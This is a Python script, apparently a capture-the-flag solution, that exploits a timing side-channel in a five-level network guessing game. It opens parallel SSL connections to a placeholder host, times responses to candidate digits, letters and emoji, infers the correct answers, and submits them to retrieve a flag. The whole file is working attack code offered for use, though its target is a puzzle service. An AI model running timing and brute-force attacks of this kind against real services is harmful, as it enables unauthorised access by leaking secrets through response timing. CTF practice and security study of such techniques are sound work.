import socket
import time
import json
import os
import asyncio
import ssl as ssl_module
from concurrent.futures import ThreadPoolExecutor

# Configuration
HOST = 'INSERT URL HERE'
PORT = 1337
USE_SSL = True
MAX_WORKERS = 10  # Number of parallel connections

emoji_list = [
    "😊", "❤️", "⭐", "🔥", "🌈", 
    "🎉", "🎈", "🌟", "🍀", "🍕", 
    "🎂", "🌍", "🚀", "💎", "🎵", 
    "🐾", "🌻", "🦄", "⚡", "🌙"
]
emoji_list_2 = [
    "😄", "💖", "🌊", "🍉", "🌺", 
    "🥳", "🍔", "🦋", "🍂", "🏆", 
    "🥇", "🌼", "🌈", "🍦", "🐉", 
    "🌴", "🧩", "🎤", "🌌", "🧙‍♂️"
]
level5_answers = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"

def create_socket():
    """Create socket with optional SSL"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if USE_SSL:
        context = ssl_module.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=HOST)
    return sock

def test_single_guess(guess, known_answers):
    """Test a single guess and return timing + response"""
    try:
        sock = create_socket()
        sock.connect((HOST, PORT))
        
        # Welcome message
        sock.recv(4096)
        sock.sendall(b'1\n')  # Start game
        
        # Replay known answers first
        for known_answer in known_answers:
            sock.recv(4096)  # Receive level prompt
            sock.sendall(known_answer.encode('utf-8') + b'\n')
        
        # Now test current level
        sock.recv(4096)  # Receive current level prompt
        
        start = time.time()
        sock.sendall(guess.encode('utf-8') + b'\n')
        response = sock.recv(4096)
        elapsed = time.time() - start
        
        sock.close()
        
        response_text = response.decode().strip()
        return guess, elapsed, response_text
        
    except Exception as e:
        return guess, 0.0, f"Error: {e}"

async def measure_timing_async(guesses, level_name, known_answers=[], threshold_multiplier=1.3):
    """Measure timing for multiple guesses asynchronously"""
    print(f"\n[*] Testing {level_name} with {len(guesses)} possibilities...")
    print(f"[*] Running {MAX_WORKERS} parallel connections...")
    
    baseline_time = None
    results = []
    
    # Run tests in parallel using ThreadPoolExecutor
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [
            loop.run_in_executor(executor, test_single_guess, guess, known_answers)
            for guess in guesses
        ]
        
        # Gather results as they complete
        for future in asyncio.as_completed(futures):
            guess, elapsed, response_text = await future
            
            # If time is 0.00 or very close to 0, connection closed immediately (wrong guess)
            if elapsed < 0.05:
                print(f"    {guess}: {elapsed:.3f}s - Connection closed immediately (wrong)")
                continue
            
            print(f"    {guess}: {elapsed:.3f}s - {response_text[:50]}")
            results.append((guess, elapsed, response_text))
            
            # Set baseline on first valid attempt (wrong guess with proper response)
            if baseline_time is None and "Wrong guess" in response_text:
                baseline_time = elapsed
            
            # Check if this timing is significantly longer (indicates correct guess)
            if baseline_time and elapsed > baseline_time * threshold_multiplier:
                print(f"\n[+] {level_name} answer found: {guess} (time: {elapsed:.3f}s vs baseline {baseline_time:.3f}s)")
                # Cancel remaining futures
                for f in futures:
                    f.cancel()
                return guess
            
            # Also check if we got a different response (not "Wrong guess")
            if "Wrong guess" not in response_text and "Game over" not in response_text:
                print(f"\n[+] {level_name} answer found: {guess} (different response received)")
                # Cancel remaining futures
                for f in futures:
                    f.cancel()
                return guess
    
    # If no clear winner from timing, find longest response
    if results:
        results.sort(key=lambda x: x[1], reverse=True)
        best_guess = results[0]
        print(f"\n[+] {level_name} best guess: {best_guess[0]} (time: {best_guess[1]:.3f}s)")
        return best_guess[0]
    
    print(f"\n[-] Could not find answer for {level_name}")
    return None

async def exploit_async():
    """Exploit timing attack to beat all levels asynchronously"""
    print("="*60)
    print("Timing Attack Exploit - Guessing Game (Async)")
    print("="*60)
    
    known_answers = []
    
    # Level 1: Numbers 0-9
    level1_guesses = [str(i) for i in range(10)]
    answer1 = await measure_timing_async(level1_guesses, "Level 1: Numbers 0-9", known_answers)
    if answer1:
        known_answers.append(answer1)
    else:
        print("[-] Failed to find Level 1 answer")
        return
    
    # Level 2: Letters A-Z
    level2_guesses = [chr(i) for i in range(65, 91)]
    answer2 = await measure_timing_async(level2_guesses, "Level 2: Letters A-Z", known_answers)
    if answer2:
        known_answers.append(answer2)
    else:
        print("[-] Failed to find Level 2 answer")
        return
    
    # Level 3: Emoji list 1
    answer3 = await measure_timing_async(emoji_list, "Level 3: Emoji List 1", known_answers)
    if answer3:
        known_answers.append(answer3)
    else:
        print("[-] Failed to find Level 3 answer")
        return
    
    # Level 4: Emoji list 2
    answer4 = await measure_timing_async(emoji_list_2, "Level 4: Emoji List 2", known_answers)
    if answer4:
        known_answers.append(answer4)
    else:
        print("[-] Failed to find Level 4 answer")
        return
    
    # Level 5: Alphanumeric + !
    level5_guesses = list(level5_answers)
    answer5 = await measure_timing_async(level5_guesses, "Level 5: Alphanumeric + !", known_answers)
    if answer5:
        known_answers.append(answer5)
    else:
        print("[-] Failed to find Level 5 answer")
        return
    
    # Now submit all correct answers to get the flag
    print("\n" + "="*60)
    print("Submitting all answers to get the flag...")
    print("="*60)
    
    try:
        sock = create_socket()
        sock.connect((HOST, PORT))
        
        # Welcome
        print(sock.recv(4096).decode())
        sock.sendall(b'1\n')
        
        for i, answer in enumerate(known_answers):
            prompt = sock.recv(4096).decode()
            print(f"\nLevel {i+1}: {prompt.strip()}")
            print(f"Sending: {answer}")
            sock.sendall(answer.encode('utf-8') + b'\n')
        
        # Get the flag
        flag_response = sock.recv(4096).decode()
        print("\n" + "="*60)
        print("FLAG RECEIVED!")
        print("="*60)
        print(flag_response)
        
        sock.close()
        
    except Exception as e:
        print(f"Error submitting answers: {e}")

if __name__ == "__main__":
    asyncio.run(exploit_async())